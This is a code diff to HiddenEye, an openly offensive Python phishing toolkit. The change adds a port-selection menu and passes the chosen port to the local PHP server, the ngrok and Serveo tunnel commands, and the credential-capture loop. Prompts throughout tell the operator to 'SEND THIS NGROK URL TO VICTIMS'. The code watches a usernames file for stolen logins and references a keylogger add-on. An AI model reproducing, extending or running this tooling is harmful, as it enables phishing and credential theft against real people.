@@ -126,9 +126,25 @@ def runPhishing(page , customOption): #Phishing pages selection menu
     else:
        endMessage()
 
+def selectPort(): #Question where user must select port
+        system('clear')
+        print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        print(_("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}").format(MAIN0, MAIN4))
+        choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+        try:
+            if (int(choice) > 65535 or int(choice) < 1):
+                return selectPort()
+            else:
+                return choice
+        except:
+            return selectPort()
 
-
-def selectServer(): #Question where user must select server
+def selectServer(port): #Question where user must select server
         system('clear')
         print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -150,7 +166,7 @@ def selectServer(): #Question where user must select server
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
             
-            system('./Server/ngrok http 1111 > /dev/null &')
+            system('./Server/ngrok http {} > /dev/null &'.format(port))
             while True:
                 sleep(2)
                 system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
@@ -158,19 +174,19 @@ def selectServer(): #Question where user must select server
                 url = urlFile.read()
                 urlFile.close()
                 if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-                    print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
+                    print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
                     print("\n")  
                     break
 
         elif choice == '2':
             system('clear')
-            runServeo()
+            runServeo(port)
 
         else:
             system('clear')
-            return selectServer()
+            return selectServer(port)
 
-def runServeo():
+def runServeo(port):
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -178,19 +194,19 @@ def runServeo():
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. ''').format(MAIN0, MAIN2))
     print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates desiMAIN0 url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
+    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
     choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system('clear')
     if choice == '1':
 
-        customServeo()
+        customServeo(port)
     elif choice == '2':
-        randomServeo()
+        randomServeo(port)
     else:
         system('clear')
-        return runServeo()
+        return runServeo(port)
 
-def customServeo():
+def customServeo(port):
 
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -203,7 +219,7 @@ def customServeo():
         lnk += ".serveo.net"
     else:
         pass
-    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:1111 serveo.net > link.url 2> /dev/null &' % (lnk))
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
     sleep(7)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
@@ -215,7 +231,7 @@ def customServeo():
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
 
     except CalledProcessError:
@@ -223,9 +239,9 @@ def customServeo():
 ''').format(MAIN0, MAIN4))
         sleep(4)
         system('clear')
-        return customServeo()
+        return customServeo(port)
 
-def randomServeo():
+def randomServeo(port):
     system('clear')
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -233,18 +249,18 @@ def randomServeo():
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
     sleep(8)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
         url = str(output).strip("b ' \ n r")
-        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN4, MAIN3) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
     except CalledProcessError:
 
         sleep(4)
         system('clear')
-        return randomServeo()
+        return randomServeo(port)
 
 def runMainMenu(): #menu where user select what they wanna use
 
@@ -515,9 +531,9 @@ def addkeylogger():
          print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4))
          sleep(2)
 
-def runServer():
-    system("fuser -k 1111/tcp > /dev/null 2>&1")
-    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
+def runServer(port):
+    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
+    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
 
 
 
@@ -544,10 +560,10 @@ def endMessage(): #Message when HiddenEye exit
             system('clear')
             return endMessage()
 
-def getCredentials():
+def getCredentials(port):
 
 
-    print(_("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0))
+    print(_("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0, port))
     print(_("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n").format(MAIN0, MAIN2, MAIN4))
     while True:
         with open('Server/www/usernames.txt') as creds:
